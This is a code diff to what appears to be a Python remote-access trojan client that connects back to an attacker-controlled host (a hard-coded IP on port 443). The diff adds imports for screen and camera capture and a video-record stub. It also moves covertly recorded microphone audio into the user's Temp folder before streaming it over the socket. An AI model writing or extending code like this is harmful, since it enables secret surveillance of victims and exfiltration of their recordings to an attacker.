@@ -10,7 +10,11 @@ import sounddevice
 from scipy.io.wavfile import write
 import time
 from subprocess import Popen, PIPE
-clientHOST = "YOUR>IP"
+import cv2
+import numpy as np
+import pyautogui
+
+clientHOST = "192.168.1.107"
 clientPORT = 443
 BUFFER_SIZE = 1024
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -45,6 +49,8 @@ while True:
         channel = 1
         record = sounddevice.rec(int(seconds*frames), samplerate=frames, channels=channel)
         sounddevice.wait()
-        write("aud0.wav", frames, record)
-        with open('aud0.wav', 'rb') as f:
+        write(f"{os.environ['USERPROFILE']}\\\AppData\\Local\\Temp\\aud0.wav", frames, record)
+        with open(f"{os.environ['USERPROFILE']}\\\AppData\\Local\\Temp\\aud0.wav", 'rb') as f:
             for l in f: s.sendall(l)
+    elif Handler_DATA == "vid_record":
+        pass
